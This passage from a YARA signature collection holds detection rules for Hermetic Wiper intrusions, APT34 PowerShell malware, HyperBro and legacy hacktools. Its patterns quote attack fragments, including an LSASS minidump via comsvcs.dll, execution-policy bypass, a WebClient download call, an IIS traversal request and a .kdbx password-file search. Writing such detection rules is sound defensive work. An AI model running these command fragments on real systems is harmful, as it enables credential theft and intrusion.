		id = "77f793c1-b02c-59c3-b3e4-75758f5b3b8d"
		date = "2022-02-25"
		modified = "2023-12-05"
		reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_ua_hermetic_wiper.yar#L40-L70"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "5e917618a5172c68b4b32ba9e63402c2a98ccb027276b317ec169a4fef219de1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$sx1 = "/c powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump" ascii wide
		$sx2 = "appdata\\local\\microsoft\\windows\\winupd.log" ascii wide
		$sx3 = "AppData\\Local\\Microsoft\\Windows\\Winupd.log" ascii wide
		$sx4 = "CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1" ascii wide
		$sx5 = "\\policydefinitions\\postgresql.exe" ascii wide
		$sx6 = "powershell -v 2 -exec bypass -File text.ps1" ascii wide
		$sx7 = "powershell -exec bypass gp.ps1" ascii wide
		$sx8 = "powershell -exec bypass -File link.ps1" ascii wide
		$sx9 = " 1> \\\\127.0.0.1\\ADMIN$\\__16" ascii wide
		$sa1 = "(New-Object System.Net.WebClient).DownloadFile(" ascii wide
		$sa2 = "CSIDL_SYSTEM_DRIVE\\temp\\" ascii wide
		$sa3 = "1> \\\\127.0.0.1\\ADMIN$" ascii wide
		$fp1 = "<html" ascii

	condition:
		1 of ( $sx* ) or all of ( $sa* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_APT_UA_Hermetic_Wiper_Scheduled_Task_Feb22_1
{
	meta:
		description = "Detects scheduled task pattern found in Hermetic Wiper malware related intrusions"
		author = "Florian Roth (Nextron Systems)"
		id = "a628f773-9c71-5979-a4db-37b6b6bd6a56"
		date = "2022-02-25"
		modified = "2023-12-05"
		reference = "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_ua_hermetic_wiper.yar#L72-L88"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "56368ba1c97fe3455312b6ee86dcd1a21677f7dfa3836e76ada4b236a5b2c171"
		score = 85
		quality = 85
		tags = ""

	strings:
		$a0 = "<Task version=" ascii wide
		$sa1 = "CSIDL_SYSTEM_DRIVE\\temp" ascii wide
		$sa2 = "postgresql.exe 1> \\\\127.0.0.1\\ADMIN$" ascii wide
		$sa3 = "cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE" ascii wide

	condition:
		$a0 and 1 of ( $s* )
}

rule SIGNATURE_BASE_Base64_PS1_Shellcode
{
	meta:
		description = "Detects Base64 encoded PS1 Shellcode"
		author = "Nick Carr, David Ledbetter"
		id = "7c3cec3b-a192-5bfd-b4f1-22b1afeb717e"
		date = "2018-11-14"
		modified = "2023-12-05"
		reference = "https://twitter.com/ItsReallyNick/status/1062601684566843392"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_ps1_shellcode.yar#L1-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "fac6f41965eb2209f1552763800d6a2b172f28cd29bb7586d180654aab1e6d56"
		score = 65
		quality = 85
		tags = ""

	strings:
		$substring = "AAAAYInlM"
		$pattern1 = "/OiCAAAAYInlM"
		$pattern2 = "/OiJAAAAYInlM"

	condition:
		$substring and 1 of ( $p* )
}

rule SIGNATURE_BASE_APT_APT34_PS_Malware_Apr19_1
{
	meta:
		description = "Detects APT34 PowerShell malware"
		author = "Florian Roth (Nextron Systems)"
		id = "6a082c5a-ee5b-5002-9148-61bbcfedfe68"
		date = "2019-04-17"
		modified = "2023-12-05"
		reference = "https://twitter.com/0xffff0800/status/1118406371165126656"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_oilrig.yar#L267-L283"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "afe203fdfcc9dcafb170bee972d45e66e5483a777112a00fa30516dfe81bbf88"
		score = 75
		quality = 85
		tags = ""
		hash1 = "b1d621091740e62c84fc8c62bcdad07873c8b61b83faba36097ef150fd6ec768"

	strings:
		$x1 = "= get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID" ascii
		$x2 = "Write-Host \"excepton occured!\"" ascii
		$s1 = "Start-Sleep -s 1;" fullword ascii
		$s2 = "Start-Sleep -m 100;" fullword ascii

	condition:
		1 of ( $x* ) or 2 of them
}

rule SIGNATURE_BASE_Windowscredentialeditor
{
	meta:
		description = "Windows Credential Editor"
		author = "Florian Roth"
		id = "1542c6e4-36b2-5272-85d0-43226869b43e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L20-L32"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "531a0bdc893d89b1c14deee11df95b430051cef07744a15b5d606e1c5378db97"
		score = 90
		quality = 85
		tags = ""
		threat_level = 10

	strings:
		$a = "extract the TGT session key"
		$b = "Windows Credentials Editor"

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Portscanner_Simple_Jan14
{
	meta:
		description = "Auto-generated rule on file PortScanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "3e8960ce-0428-51e1-b992-4fa09fee8520"
		date = "2025-04-14"
		modified = "2025-04-14"
		old_rule_name = "PortScanner"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L171-L183"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b381b9212282c0c650cb4b0323436c63"
		logic_hash = "c69269b227d46b5b970cfc094b3154b0a533b439b8ed492a2059025bc96d17a0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Scan Ports Every"
		$s3 = "Scan All Possible Ports!"

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Moorer_Port_Scanner
{
	meta:
		description = "Auto-generated rule on file MooreR Port Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "5d8fb83f-bed3-53d2-bd33-2158911dc7c8"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L204-L217"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "376304acdd0b0251c8b19fea20bb6f5b"
		logic_hash = "248f437964fc6f7836f6b4c87e1f35bb1bac25a1a484cdf1a4065e7efb823b51"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Description|"
		$s3 = "soft Visual Studio\\VB9yp"
		$s4 = "adj_fptan?4"
		$s7 = "DOWS\\SyMem32\\/o"

	condition:
		all of them
}

rule SIGNATURE_BASE_Netbios_Name_Scanner
{
	meta:
		description = "Auto-generated rule on file NetBIOS Name Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "03716e00-a969-5ab5-9be7-e8fc4272e40f"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L219-L231"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "888ba1d391e14c0a9c829f5a1964ca2c"
		logic_hash = "19b40a283b74317fece2f5be0ee3e38227d9631eebbc7efb0ea19056b52630f1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "IconEx"
		$s2 = "soft Visual Stu"
		$s4 = "NBTScanner!y&"

	condition:
		all of them
}

rule SIGNATURE_BASE_Cgisscan_Cgiscan
{
	meta:
		description = "Auto-generated rule on file CGIScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "60bd5038-a308-55fd-85bb-2c4183f1c951"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L247-L259"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "338820e4e8e7c943074d5a5bc832458a"
		logic_hash = "5bd856a77c53616cf78d093462f8b7ca5a5fb0924406a02941d86bdb015a1fbc"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Wang Products" fullword wide
		$s2 = "WSocketResolveHost: Cannot convert host address '%s'"
		$s3 = "tcp is the only protocol supported thru socks server"

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_IP_Stealing_Utilities
{
	meta:
		description = "Auto-generated rule on file IP Stealing Utilities.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "3a947e9c-d707-5819-88f2-059585750048"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L261-L272"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "65646e10fb15a2940a37c5ab9f59c7fc"
		logic_hash = "38958edeee6e140e11267cdd7899ad517799dbce33ac267d51dea0f8aecfa1ee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "DarkKnight"
		$s9 = "IPStealerUtilities"

	condition:
		all of them
}

rule SIGNATURE_BASE_Superscan4
{
	meta:
		description = "Auto-generated rule on file SuperScan4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "bd353382-ffa2-56c5-b842-1ffc94d6849e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L274-L287"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "78f76428ede30e555044b83c47bc86f0"
		logic_hash = "7f76c59e85efac5c150f783606e2a9bdc8724c6afd9f9c6405d63f7467c72752"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = " td class=\"summO1\">"
		$s6 = "REM'EBAqRISE"
		$s7 = "CorExitProcess'msc#e"

	condition:
		all of them
}

rule SIGNATURE_BASE_Portracer
{
	meta:
		description = "Auto-generated rule on file PortRacer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "54717938-2f4c-5442-b0ad-40b9acd1101a"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L288-L300"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2834a872a0a8da5b1be5db65dfdef388"
		logic_hash = "f6ad85a8970b10e25becca76e17bff30cbc787ed45f331af4ecf9563ff11b65d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Auto Scroll BOTH Text Boxes"
		$s4 = "Start/Stop Portscanning"
		$s6 = "Auto Save LogFile by pressing STOP"

	condition:
		all of them
}

rule SIGNATURE_BASE_Scanarator
{
	meta:
		description = "Auto-generated rule on file scanarator.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "dfc3ff29-03b4-58ca-bfe0-c6888fddab67"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L302-L312"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "848bd5a518e0b6c05bd29aceb8536c46"
		logic_hash = "9400435470c26245cd814e1e39f275eb22566d66d1a72d4f3e618a6ad11bc8d9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"

	condition:
		all of them
}

rule SIGNATURE_BASE_Aolipsniffer
{
	meta:
		description = "Auto-generated rule on file aolipsniffer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "f7cc0f31-6ba4-504b-82de-0334257b8a95"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L314-L332"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "51565754ea43d2d57b712d9f0a3e62b8"
		logic_hash = "e627b8ea85e4325714c98e93ad6147adfa600af548a80dce8548b7f5743733b5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB"
		$s1 = "dwGetAddressForObject"
		$s2 = "Color Transfer Settings"
		$s3 = "FX Global Lighting Angle"
		$s4 = "Version compatibility info"
		$s5 = "New Windows Thumbnail"
		$s6 = "Layer ID Generator Base"
		$s7 = "Color Halftone Settings"
		$s8 = "C:\\WINDOWS\\SYSTEM\\MSWINSCK.oca"

	condition:
		all of them
}

rule SIGNATURE_BASE__Bitchin_Threads_
{
	meta:
		description = "Auto-generated rule on file =Bitchin Threads=.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "3a51e76c-b360-5f10-961c-ecc3ea3fa3c9"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L334-L345"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7491b138c1ee5a0d9d141fbfd1f0071b"
		logic_hash = "f43fec37d9dc668b562838465e5696e502c638b207e7af6a77fac5a8b00e92a8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "DarKPaiN"
		$s1 = "=BITCHIN THREADS"

	condition:
		all of them
}

rule SIGNATURE_BASE_Cgis4_Cgis4
{
	meta:
		description = "Auto-generated rule on file cgis4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "98fbf445-b7a5-58fa-8f06-34be7321e2eb"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L347-L362"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d658dad1cd759d7f7d67da010e47ca23"
		logic_hash = "2cf3fc6447323cbefe5f5ad02271eeb4c271bb9784d2c29030858542a43fbb04"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ")PuMB_syJ"
		$s1 = "&,fARW>yR"
		$s2 = "m3hm3t_rullaz"
		$s3 = "7Projectc1"
		$s4 = "Ten-GGl\""
		$s5 = "/Moziqlxa"

	condition:
		all of them
}

rule SIGNATURE_BASE_Portscan
{
	meta:
		description = "Auto-generated rule on file portscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "967d6e3b-ae0d-5f93-a20d-742fc010608d"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L364-L375"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a8bfdb2a925e89a281956b1e3bb32348"
		logic_hash = "d93b54ffc7416b5354304daf156908f11d7e320a91bd936e397a15ede63caae3"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s5 = "0    :SCAN BEGUN ON PORT:"
		$s6 = "0    :PORTSCAN READY."

	condition:
		all of them
}

rule SIGNATURE_BASE_Proport_Zip_Folder_Proport
{
	meta:
		description = "Auto-generated rule on file ProPort.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "cd611f6c-42ed-5cd3-a6ab-7e0970925e61"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L377-L394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c1937a86939d4d12d10fc44b7ab9ab27"
		logic_hash = "0ee2ffc5ed243d170b8013b3a164a3719f43bd473f4af7e1a2697d88a298fe9f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Corrupt Data!"
		$s1 = "K4p~omkIz"
		$s2 = "DllTrojanScan"
		$s3 = "GetDllInfo"
		$s4 = "Compressed by Petite (c)1999 Ian Luck."
		$s5 = "GetFileCRC32"
		$s6 = "GetTrojanNumber"
		$s7 = "TFAKAbout"

	condition:
		all of them
}

rule SIGNATURE_BASE_Stealthwasp_S_Basic_Portscanner_V1_2
{
	meta:
		description = "Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "7f706186-f2e2-5d4d-951a-2ec8fc757cec"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L396-L407"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7c0f2cab134534cd35964fe4c6a1ff00"
		logic_hash = "b01c165b5e5be3ba6905e8bc44a14c3d7195effd058e4c0c31678777d19db8b5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Basic PortScanner"
		$s6 = "Now scanning port:"

	condition:
		all of them
}

rule SIGNATURE_BASE_Bluesportscan
{
	meta:
		description = "Auto-generated rule on file BluesPortScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "4bcb8b7c-5e22-5496-9a29-66e85e3c3395"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L409-L420"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "6292f5fc737511f91af5e35643fc9eef"
		logic_hash = "5cb4e4b87eaf166c85d23114f5abc10ef83b4a29968bf6fef4b3fce7ff2787fd"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "This program was made by Volker Voss"
		$s1 = "JiBOo~SSB"

	condition:
		all of them
}

rule SIGNATURE_BASE_Scanarator_Iis
{
	meta:
		description = "Auto-generated rule on file iis.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "a467147b-53c8-53db-aa33-5f0e4e066988"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L422-L433"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3a8fc02c62c8dd65e038cc03e5451b6e"
		logic_hash = "092cb902e10624b207b7932e6b3c1fe2277ed1d183e5de9ee4d07d8548e90ab6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "example: iis 10.10.10.10"
		$s1 = "send error"

	condition:
		all of them
}

rule SIGNATURE_BASE_Stealth_Stealth
{
	meta:
		description = "Auto-generated rule on file Stealth.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "5f45882e-3e27-596d-8725-fad380e1c297"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L435-L446"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8ce3a386ce0eae10fc2ce0177bbc8ffa"
		logic_hash = "e210b1a553549c22f66511dfc9d0d3f5b17f02981b9e9915827bc909f34b3262"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "<table width=\"60%\" bgcolor=\"black\" cellspacing=\"0\" cellpadding=\"2\" border=\"1\" bordercolor=\"white\"><tr><td>"
		$s6 = "This tool may be used only by system administrators. I am not responsible for "

	condition:
		all of them
}

rule SIGNATURE_BASE_Angry_IP_Scanner_V2_08_Ipscan
{
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "5fbcbb95-6cd4-5587-bf44-5b5ed133ce5e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L448-L460"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "70cf2c09776a29c3e837cb79d291514a"
		logic_hash = "1b50856ad35c146a684298a86f1629c45996ab08ffae8486a388805262ec2367"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "_H/EnumDisplay/"
		$s5 = "ECTED.MSVCRT0x"
		$s8 = "NotSupported7"

	condition:
		all of them
}

rule SIGNATURE_BASE_Crack_Loader
{
	meta:
		description = "Auto-generated rule on file Loader.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "0c4c7b69-7739-5c1b-8c7c-4aaa724e4455"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L462-L473"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f4f79358a6c600c1f0ba1f7e4879a16d"
		logic_hash = "3380ace7c34c15dfd9a9625c8c4a1ed7e35c1cf3c2eca9b1e00dd0092d256150"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "NeoWait.exe"
		$s1 = "RRRRRRRW"

	condition:
		all of them
}

rule SIGNATURE_BASE_WCE_Modified_1_1014
{
	meta:
		description = "Modified (packed) version of Windows Credential Editor"
		author = "Florian Roth (Nextron Systems)"
		id = "536d1a7f-bda1-5c22-bf72-a177468e7c42"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L738-L752"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "09a412ac3c85cedce2642a19e99d8f903a2e0354"
		logic_hash = "f094d635aabea9b9101fad3d0d23ad37692317ae5b4f636296ee612752c4421f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "LSASS.EXE" fullword ascii
		$s1 = "_CREDS" ascii
		$s9 = "Using WCE " ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Bypassuac2
{
	meta:
		description = "Auto-generated rule - file BypassUac2.zip"
		author = "yarGen Yara Rule Generator"
		id = "8b7e49de-9b0a-5dc4-86af-1a854dc649cc"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L955-L967"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ef3e7dd2d1384ecec1a37254303959a43695df61"
		logic_hash = "398783fa0453a60fd1c6aa64eacfbfa7c5385e81c79d1b6a8a8386dae9b825cc"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "/BypassUac/BypassUac/BypassUac_Utils.cpp" fullword ascii
		$s1 = "/BypassUac/BypassUacDll/BypassUacDll.aps" fullword ascii
		$s3 = "/BypassUac/BypassUac/BypassUac.ico" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Bypassuacdll_6
{
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		id = "5be27053-446f-5ea3-a242-2661aeffa3df"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L1000-L1011"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
		logic_hash = "3cb89875ddf79a3709aeb58149e228e03b9fb43fa1565aab5ece743857b4cc71"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "BypassUacDLL.dll" fullword wide
		$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Lazagne_Gen_18
{
	meta:
		description = "Detects Lazagne password extractor hacktool"
		author = "Florian Roth (Nextron Systems)"
		id = "034ea6d8-f5cf-5664-9ff9-24d19403093d"
		date = "2018-12-11"
		modified = "2025-04-14"
		reference = "https://creativecommons.org/licenses/by-nc/4.0/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L4572-L4589"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6f3e895080267a551a3b7a0ba2d4207b31befacbd35d1e6941e1b69d7e2689ce"
		score = 80
		quality = 85
		tags = ""
		hash1 = "51121dd5fbdfe8db7d3a5311e3e9c904d644ff7221b60284c03347938577eecf"

	strings:
		$x1 = "lazagne.config.powershell_execute(" ascii
		$x2 = "creddump7.win32." ascii
		$x3 = "lazagne.softwares.windows.hashdump" ascii
		$x4 = ".softwares.memory.libkeepass.common(" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_HKTL_Nopowershell
{
	meta:
		description = "Detects NoPowerShell hack tool"
		author = "Florian Roth (Nextron Systems)"
		id = "17d508d5-833f-5232-a071-dbed8758493b"
		date = "2018-12-28"
		modified = "2022-12-21"
		reference = "https://github.com/bitsadmin/nopowershell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L4591-L4608"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2207af9fcc61d547dfeff347a1eae2c59024a7270d1b8cbb7abef56d80864728"
		score = 75
		quality = 85
		tags = ""
		hash1 = "2dad091dd00625762a7590ce16c3492cbaeb756ad0e31352a42751deb7cf9e70"

	strings:
		$x1 = "\\NoPowerShell.pdb" ascii
		$x2 = "Invoke-WmiMethod -Class Win32_Process -Name Create \"cmd" fullword wide
		$x3 = "ls C:\\Windows\\System32 -Include *.exe | select -First 10 Name,Length" fullword wide
		$x4 = "ls -Recurse -Force C:\\Users\\ -Include *.kdbx" fullword wide
		$x5 = "NoPowerShell.exe" fullword wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_Hvs_APT27_Hyperbro_Stage3_Persistence
{
	meta:
		description = "HyperBro Stage 3 registry keys for persistence"
		author = "Marko Dorfhuber"
		id = "2bb1d28b-5fc4-5f0b-b546-c8b8192b0d48"
		date = "2022-02-07"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_apt27_hyperbro.yar#L103-L117"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
